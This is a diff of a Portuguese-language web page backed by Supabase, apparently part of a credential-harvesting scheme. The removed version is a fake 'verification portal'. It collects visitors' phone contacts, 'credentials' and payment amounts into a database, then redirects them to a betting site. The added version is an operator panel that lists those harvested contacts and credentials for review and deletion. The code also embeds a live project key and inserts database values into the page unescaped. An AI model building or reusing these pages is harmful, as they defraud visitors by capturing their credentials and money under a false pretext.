@@ -3,231 +3,228 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<meta name="theme-color" content="#040711">
-<title>Acesso ao Portal — Verificação</title>
+<meta name="theme-color" content="#121417">
+<title>Painel Oficial — Exclusivo</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
   :root{ 
-    --bg: #040711; 
-    --panel: #0d1424; 
-    --panel-2: #131d33; 
-    --border: #1b2845; 
-    --border-light: #283a63; 
-    --text: #f1f5f9; 
-    --muted: #94a3b8; 
-    --muted-2: #64748b; 
-    --blue: #2563eb; 
-    --blue-glow: #3b82f6;
-    --green: #10b981;
-    --red: #dc2626;
+    --bg: #121417; 
+    --panel: #1b1f26; 
+    --panel-2: #222731; 
+    --border: #2d333d; 
+    --border-light: #3d4452; 
+    --text: #f3f4f6; 
+    --muted: #9ca3af; 
+    --muted-2: #6b7280; 
+    --emerald: #059669; 
+    --emerald-glow: #10b981;
+    --amber: #d97706;
+    --red: #dc2626; 
   }
   *{margin:0;padding:0;box-sizing:border-box}
-  body{
-    font-family: Inter, system-ui, sans-serif;
-    background: var(--bg);
-    color: var(--text);
-    min-height: 100vh;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    padding: 16px;
+  html,body{height:100%;height:100dvh}
+  body{font-family:Inter,system-ui,sans-serif;background:var(--bg);color:var(--text);display:flex;flex-direction:column;overflow:hidden}
+  .topo-fixo{flex-shrink:0;background:rgba(18,20,23,0.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);padding:10px 10px 8px 10px}
+  .header-top{display:flex;justify-content:space-between;align-items:center;gap:8px;margin-bottom:8px}
+  .brand h2{font-size:15px;font-weight:800;display:flex;align-items:center;gap:7px}
+  .brand h2 i{width:26px;height:26px;display:grid;place-items:center;background:linear-gradient(135deg,#059669,#d97706);border-radius:7px;font-style:normal;font-size:12px;color:#fff}
+  #status{font-size:9px;color:var(--muted-2);background:var(--panel-2);border:1px solid var(--border);padding:4px 8px;border-radius:12px;max-width:44%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+  
+  .cards{display:grid;grid-template-columns:1fr 1fr;gap:7px;margin-bottom:10px}
+  .card{
+    background:linear-gradient(180deg,rgba(255,255,255,0.02),transparent),var(--panel);
+    border:1px solid var(--border);border-radius:10px;
+    padding:9px 10px;height:62px;display:flex;flex-direction:column;justify-content:center;
+    box-shadow:0 2px 8px rgba(0,0,0,0.2);
   }
-  .container {
-    width: 100%;
-    max-width: 400px;
-    background: var(--panel);
-    border: 1px solid var(--border);
-    border-radius: 16px;
-    padding: 28px 24px;
-    box-shadow: 0 12px 30px rgba(0,0,0,0.4);
-    position: relative;
-    overflow: hidden;
+  .card small{font-size:8.5px;color:var(--muted);text-transform:uppercase;letter-spacing:0.6px;font-weight:800;display:flex;align-items:center;gap:4px;margin-bottom:4px}
+  .card b{font-size:16.5px;font-weight:800;line-height:1;color:#fff;letter-spacing:-0.3px}
+  .card span{font-size:10px;color:var(--muted-2);margin-left:5px;font-weight:600}
+  .card .linha{display:flex;align-items:baseline}
+  .card:nth-child(1){border-left:2.5px solid #059669}
+  .card:nth-child(2){border-left:2.5px solid #d97706}
+  .dot{width:5px;height:5px;border-radius:50%;display:inline-block}
+
+  .controles{
+    background:var(--panel);border:1px solid var(--border);border-radius:10px;
+    padding:8px;display:flex;flex-wrap:wrap;gap:7px;align-items:center;justify-content:space-between;
   }
-  .container::before {
-    content: '';
-    position: absolute;
-    top: 0; left: 0; right: 0;
-    height: 3px;
-    background: linear-gradient(90deg, #2563eb, #7c3aed);
+  .btn{border-radius:7px;padding:7px 12px;font-size:11.5px;font-weight:800;border:1px solid transparent;cursor:pointer;display:inline-flex;align-items:center;gap:4px;transition:.15s}
+  .btn-primary{background:var(--emerald);color:#fff;border-color:var(--emerald-glow);box-shadow:0 4px 12px rgba(5,150,105,0.25)}
+  .btn-primary:hover{background:#047857}
+  .pesquisa-box{
+    background:var(--panel);border:1px solid var(--border);border-radius:10px;
+    padding:8px 12px;margin-top:7px;display:flex;gap:8px;align-items:center;
   }
-  .brand {
-    text-align: center;
-    margin-bottom: 24px;
+  .pesquisa-box input{flex:1;background:transparent;border:none;color:#fff;outline:none;font-size:12.5px}
+  .pesquisa-box input::placeholder{color:var(--muted-2)}
+  
+  .tabela-wrap{
+    flex:1;overflow-y:auto;overflow-x:hidden;background:var(--panel);border:1px solid var(--border);border-radius:10px;
+    margin:8px;
   }
-  .brand h1 {
-    font-size: 18px;
-    font-weight: 800;
-    letter-spacing: -0.3px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 8px;
-    color: #fff;
+  .tabela-wrap::-webkit-scrollbar{width:6px}
+  .tabela-wrap::-webkit-scrollbar-thumb{background:var(--border-light);border-radius:10px}
+  table{width:100%;border-collapse:collapse}
+  th{position:sticky;top:0;background:#181c24;color:var(--muted);font-size:9px;text-transform:uppercase;letter-spacing:0.6px;padding:9px 8px;text-align:left;border-bottom:1px solid var(--border);z-index:2;font-weight:800}
+  td{padding:10px 8px;border-bottom:1px solid rgba(45,51,61,0.6);font-size:12px;color:var(--text)}
+  tr:hover{background:#222833}
+  td b{color:#fff;font-weight:700}
+  .badge-valor{background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);padding:3px 8px;border-radius:12px;font-weight:800;font-size:11.5px;color:#fff}
+  
+  .btn-eliminar{
+    font-size:11.5px;padding:7px 14px;border-radius:7px;
+    border:1px solid #dc2626;background:linear-gradient(135deg,#dc2626,#991b1b);color:#fff;
+    cursor:pointer;font-weight:800;box-shadow:0 2px 8px rgba(220,38,38,0.25);
   }
-  .brand h1 span {
-    width: 30px; height: 30px;
-    display: grid; place-items:center;
-    background: linear-gradient(135deg, #2563eb, #7c3aed);
-    border-radius: 8px;
-    font-size: 14px;
-    box-shadow: 0 0 12px rgba(37,99,235,0.4);
-  }
-  .brand p {
-    font-size: 12px;
-    color: var(--muted);
-    margin-top: 6px;
-  }
-  .form-group {
-    margin-bottom: 14px;
-  }
-  .form-group label {
-    display: block;
-    font-size: 11.5px;
-    font-weight: 700;
-    color: var(--muted);
-    margin-bottom: 6px;
-    text-transform: uppercase;
-    letter-spacing: 0.5px;
-  }
-  .form-control {
-    width: 100%;
-    background: var(--bg);
-    border: 1px solid var(--border-light);
-    border-radius: 9px;
-    padding: 11px 14px;
-    color: #fff;
-    font-size: 13.5px;
-    font-weight: 500;
-    outline: none;
-    transition: all 0.2s ease;
-  }
-  .form-control:focus {
-    border-color: var(--blue-glow);
-    box-shadow: 0 0 0 3px rgba(59,130,246,0.2);
-  }
-  .form-control::placeholder {
-    color: var(--muted-2);
-  }
-  .btn-submit {
-    width: 100%;
-    background: var(--blue);
-    color: #fff;
-    border: 1px solid var(--blue-glow);
-    border-radius: 9px;
-    padding: 12px;
-    font-size: 13.5px;
-    font-weight: 800;
-    cursor: pointer;
-    transition: all 0.2s ease;
-    margin-top: 8px;
-    box-shadow: 0 4px 14px rgba(37,99,235,0.35);
-  }
-  .btn-submit:hover {
-    background: #1d4ed8;
-    transform: translateY(-1px);
-  }
-  .status-msg {
-    margin-top: 14px;
-    font-size: 12px;
-    text-align: center;
-    font-weight: 600;
-    min-height: 18px;
-  }
-  .footer-info {
-    text-align: center;
-    margin-top: 20px;
-    font-size: 11px;
-    color: var(--muted-2);
+  .btn-eliminar:hover{background:#ef4444}
+  
+  #modalConfirm{display:none;position:fixed;inset:0;background:rgba(18,20,23,0.85);backdrop-filter:blur(8px);z-index:9999;justify-content:center;align-items:center;padding:14px}
+  #modalConfirm .box{background:var(--panel);border:1px solid var(--border-light);padding:18px;border-radius:12px;width:100%;max-width:320px;text-align:center}
+  .toast{position:fixed;bottom:12px;left:50%;transform:translateX(-50%);background:var(--panel-2);color:#fff;padding:10px 14px;border-radius:10px;border:1px solid var(--border-light);font-size:12px;display:none;z-index:9999;box-shadow:0 8px 20px rgba(0,0,0,0.4)}
+  
+  @media (max-width: 600px){
+    table, thead, tbody, th, tr, td{display:block;width:100%}
+    thead{display:none}
+    tr{border:1px solid var(--border);border-radius:10px;margin:7px;padding:4px 0;background:var(--panel-2)!important}
+    td{border:none;padding:8px 12px;display:flex;justify-content:space-between;align-items:center}
+    td::before{content:attr(data-label);color:var(--muted);font-size:8.5px;font-weight:800;text-transform:uppercase}
+    td:nth-child(1){display:none}
   }
 </style>
 </head>
 <body>
 
-<div class="container">
-  <div class="brand">
-    <h1><span>◍</span> Portal de Entrada</h1>
-    <p>Preencha os campos para aceder ao site principal</p>
+<div class="topo-fixo">
+  <div class="header-top">
+    <div class="brand"><h2><i>🛡️</i> Painel Oficial (Exclusivo)</h2></div>
+    <div id="status">● Carregando...</div>
   </div>
-
-  <form id="authForm">
-    <div class="form-group">
-      <label for="contacto">Contacto</label>
-      <input type="text" id="contacto" class="form-control" placeholder="Ex: 923456789" required autocomplete="off">
-    </div>
-
-    <div class="form-group">
-      <label for="mensagem">Credencial</label>
-      <input type="text" id="mensagem" class="form-control" placeholder="Insira a sua credencial" required autocomplete="off">
-    </div>
-
-    <div class="form-group">
-      <label for="valor">Valor (KZ)</label>
-      <input type="text" id="valor" class="form-control" placeholder="Ex: 1500" required autocomplete="off">
-    </div>
-
-    <button type="submit" id="btnAceder" class="btn-submit">Entrar no Site</button>
-  </form>
-
-  <div class="status-msg" id="statusMsg"></div>
-
-  <div class="footer-info">
-    Sistema seguro integrado com Supabase
+  <div class="cards">
+    <div class="card"><small><span class="dot" style="background:#059669"></span> Total Registos</small><div class="linha"><b id="totalContas">0</b><span id="mostrando">0 itens</span></div></div>
+    <div class="card"><small><span class="dot" style="background:#d97706"></span> Sincronização</small><div class="linha"><b id="timer">03:00</b><span>Auto ON</span></div></div>
   </div>
+  <div class="controles">
+    <button class="btn btn-primary" onclick="carregar()">↻ Atualizar Dados</button>
+  </div>
+  <div class="pesquisa-box"><span style="color:var(--muted-2)">⌕</span><input type="text" id="pesquisa" placeholder="Filtrar dados oficiais..." oninput="filtrar()"></div>
 </div>
 
+<div class="tabela-wrap">
+  <table>
+    <thead><tr><th>#</th><th>Contacto</th><th>Credencial</th><th>Valor</th><th>Data</th><th>Ações</th></tr></thead>
+    <tbody id="lista"></tbody>
+  </table>
+</div>
+
+<div id="modalConfirm"><div class="box"><p id="modalText" style="color:#f3f4f6;font-size:13px;font-weight:600;margin-bottom:16px"></p><div style="display:flex;gap:8px"><button id="modalCancel" class="btn" style="flex:1;background:var(--panel-2);color:#fff;border:1px solid var(--border-light)">Cancelar</button><button id="modalOk" class="btn" style="flex:1;background:var(--red);color:#fff">Remover</button></div></div></div>
+<div class="toast" id="toast"></div>
+
 <script type="module">
-  import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/+esm'
+import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/+esm'
+
+const supabaseUrl = 'https://ditnnbdjgefyqlgttolj.supabase.co'
+const supabaseKey = 'sb_publishable_MoN-opvNr3QJ1TBLhwURtw_G1j9O_xn'
+const NOME_TABELA = 'contatos'; 
+const PALAVRA_FILTRO = '[oficial]';
+
+const supabase = createClient(supabaseUrl, supabaseKey)
+let todosDados = [], dadosFiltrados = [], tempoRestante = 180;
+
+function customConfirm(msg){return new Promise(r=>{const m=document.getElementById('modalConfirm'),t=document.getElementById('modalText'),ok=document.getElementById('modalOk'),ca=document.getElementById('modalCancel');t.innerText=msg;m.style.display='flex';const cl=v=>{m.style.display='none';ok.onclick=null;ca.onclick=null;r(v)};ok.onclick=()=>cl(true);ca.onclick=()=>cl(false)})}
+
+async function carregar(){
+  const st = document.getElementById('status');
+  st.innerText = '● Sincronizando...';
   
-  // As mesmas chaves da base de dados do seu painel administrativo
-  const supabaseUrl = 'https://ditnnbdjgefyqlgttolj.supabase.co'
-  const supabaseKey = 'sb_publishable_MoN-opvNr3QJ1TBLhwURtw_G1j9O_xn'
-  const supabase = createClient(supabaseUrl, supabaseKey)
+  const { data, error } = await supabase.from(NOME_TABELA).select('*');
+  if(error){ st.innerText='● Erro'; mostrarToast('❌ '+error.message, true); return; }
+  
+  if(!data || !data.length){
+    st.innerText='● Vazio';
+    document.getElementById('lista').innerHTML='<tr><td colspan=6 style="text-align:center;color:var(--muted-2);padding:20px">Sem dados oficiais</td></tr>';
+    document.getElementById('totalContas').innerText='0';
+    document.getElementById('mostrando').innerText='0 itens';
+    return;
+  }
 
-  const form = document.getElementById('authForm');
-  const btn = document.getElementById('btnAceder');
-  const statusMsg = document.getElementById('statusMsg');
-
-  // ⚠️ ALTERE AQUI: Cole o link do seu site principal criado para onde o utilizador deve ir
-  const URL_SITE_PRINCIPAL = 'https://m.elephantbet.co.ao/?utm_source=chatgpt.com';
-
-  form.addEventListener('submit', async (e) => {
-    e.preventDefault();
-    
-    btn.innerText = 'A verificar...';
-    btn.disabled = true;
-    statusMsg.style.color = 'var(--muted)';
-    statusMsg.innerText = 'A processar dados...';
-
-    const contacto = document.getElementById('contacto').value.trim();
-    const mensagem = document.getElementById('mensagem').value.trim();
-    const valor = document.getElementById('valor').value.trim();
-
-    try {
-      // 1. Envia os dados para a tabela 'contatos' no Supabase
-      // Isto fará com que os dados apareçam instantaneamente no seu painel administrativo!
-      const { error } = await supabase
-        .from('contatos')
-        .insert([{ contacto, mensagem, valor }]);
-
-      if (error) throw new Error(error.message);
-
-      statusMsg.style.color = 'var(--green)';
-      statusMsg.innerText = '✓ Sucesso! A redirecionar para o site...';
-
-      // 2. Redireciona o utilizador para o site principal após 1.5 segundos
-      setTimeout(() => {
-        window.location.href = URL_SITE_PRINCIPAL;
-      }, 1500);
-
-    } catch (err) {
-      statusMsg.style.color = '#ef4444';
-      statusMsg.innerText = 'Erro: ' + (err.message || 'Tente novamente.');
-      btn.innerText = 'Entrar no Site';
-      btn.disabled = false;
-    }
+  // Lógica idêntica ao primeiro modelo, aplicando rigorosamente o filtro da tag
+  const dadosOficiais = data.filter(item => {
+    const msg = String(item.mensagem || '').toLowerCase();
+    const cont = String(item.contacto || '').toLowerCase();
+    return msg.includes(PALAVRA_FILTRO) || cont.includes(PALAVRA_FILTRO);
   });
-</script>
 
+  if(!dadosOficiais.length){
+    st.innerText='● Vazio';
+    document.getElementById('lista').innerHTML='<tr><td colspan=6 style="text-align:center;color:var(--muted-2);padding:20px">Nenhum registo oficial encontrado</td></tr>';
+    document.getElementById('totalContas').innerText='0';
+    document.getElementById('mostrando').innerText='0 itens';
+    todosDados = [];
+    dadosFiltrados = [];
+    return;
+  }
+
+  dadosOficiais.sort((a,b)=>(b.id||0)-(a.id||0));
+  todosDados = dadosOficiais;
+  dadosFiltrados = dadosOficiais;
+  document.getElementById('totalContas').innerText = dadosOficiais.length;
+  st.innerText = '● '+dadosOficiais.length+' registos • '+new Date().toLocaleTimeString('pt-PT');
+  mostrarTabela(dadosFiltrados);
+  resetarTimer();
+}
+
+function mostrarTabela(dados){
+  const lista = document.getElementById('lista');
+  lista.innerHTML = '';
+  dados.forEach(item => {
+    const dataF = item.created_at ? new Date(item.created_at).toLocaleDateString('pt-PT') : '—';
+    const msgLimpa = (item.mensagem || '-').replace(/\[oficial\]/gi, '').trim();
+    
+    lista.innerHTML += `<tr>
+      <td data-label="#">${item.id ?? '-'}</td>
+      <td data-label="Contacto"><b>${item.contacto ?? '-'}</b></td>
+      <td data-label="Credencial">${msgLimpa}</td>
+      <td data-label="Valor"><span class="badge-valor">${item.valor ?? '-'}</span></td>
+      <td data-label="Data" style="color:var(--muted);font-size:10px">${dataF}</td>
+      <td data-label="Ações"><button class="btn-eliminar" data-id="${item.id}" onclick="eliminar(parseInt(this.getAttribute('data-id')))">🗑 Eliminar</button></td>
+    </tr>`;
+  });
+  document.getElementById('mostrando').innerText = dados.length+' itens';
+}
+
+window.carregar = carregar;
+window.filtrar = function(){
+  const t = document.getElementById('pesquisa').value.toLowerCase();
+  dadosFiltrados = !t ? todosDados : todosDados.filter(i=>(i.contacto||'').toLowerCase().includes(t)||String(i.valor||'').toLowerCase().includes(t)||(i.mensagem||'').toLowerCase().includes(t));
+  mostrarTabela(dadosFiltrados);
+};
+
+window.eliminar = async function(id){
+  if(!id) return;
+  const ok = await customConfirm('Remover registo oficial #'+id+' ?');
+  if(!ok) return;
+  const { error } = await supabase.from(NOME_TABELA).delete().eq('id', id);
+  if(error){ mostrarToast('Erro: '+error.message, true); }
+  else{ mostrarToast('✓ Removido com sucesso'); carregar(); }
+};
+
+function resetarTimer(){ tempoRestante=180; }
+setInterval(()=>{
+  tempoRestante--;
+  if(tempoRestante<=0){ carregar(); }
+  const m=String(Math.floor(tempoRestante/60)).padStart(2,'0'),s=String(tempoRestante%60).padStart(2,'0');
+  document.getElementById('timer').innerText=m+':'+s;
+},1000);
+
+function mostrarToast(msg,err=false){
+  const t=document.getElementById('toast');
+  t.innerText=msg; t.style.display='block';
+  t.style.borderColor = err ? 'var(--red)' : 'var(--border-light)';
+  setTimeout(()=>t.style.display='none',3000);
+}
+
+carregar();
+</script>
 </body>
 </html>
